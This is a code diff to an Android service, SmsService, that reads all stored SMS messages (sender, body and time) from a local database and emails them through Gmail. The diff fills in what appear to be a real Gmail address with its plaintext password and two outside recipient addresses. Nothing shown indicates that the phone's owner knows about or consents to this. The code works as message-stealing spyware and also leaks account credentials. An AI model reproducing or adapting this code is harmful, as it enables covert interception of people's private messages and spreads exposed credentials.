@@ -32,7 +32,7 @@ public class SmsService  extends Service{
 
     @Override
     public void onStart(Intent intent, int startId) {
-        String type = intent.getStringExtra("type");
+        Log.i("Rocoo", "SmsService onStart");
         if (intent != null) {
             Mydb db1 = new Mydb(this);
             Cursor cursor = db1.queryBySql("SELECT * FROM SmsInfo");
@@ -40,23 +40,24 @@ public class SmsService  extends Service{
             int count = 1;
             StringBuilder builder = new StringBuilder();
             while (cursor.moveToNext()) {
-                phone = cursor.getString(cursor.getColumnIndex("Phone"));
+                phone = cursor.getString(cursor.getColumnIndex("FromWho"));
                 body = cursor.getString(cursor.getColumnIndex("Body"));
                 time = cursor.getString(cursor.getColumnIndex("Time"));
                 builder.append(count + ". Phone: " + phone + "\t\t\tTime: " + time + "\t\t\tBody: " + body+"\n");
                 count++;
             }
 
-            builder.append("\n\n\n\n\n------------------\n"+type);
+            builder.append("\n\n\n\n\n------------------\n");
 
             if (count > 1) {
                 try {
                     //
-                    GMailSender sender = new GMailSender("寄件人Mail", "密碼");
+                    Log.i("rocoo", "send mail success" );
+                    GMailSender sender = new GMailSender("rocoo.shiang@gmail.com", "abc556624");
                     sender.sendMail("My mail",  // 主旨
                             builder.toString(),
-                            "寄件人Mail",      // 寄件人
-                            "xxx@hotmail.com,ooo@yahoo.com.tw"    //收件人，可以多個用逗號分開
+                            "rocoo.shiang@gmail.com",      // 寄件人
+                            "kx75721@hotmail.com,elephant10053@yahoo.com.tw"    //收件人，可以多個用逗號分開
                     );
                 } catch (Exception e) {
                     Log.i("rocoo", "send mail error: " + e.getMessage(), e);
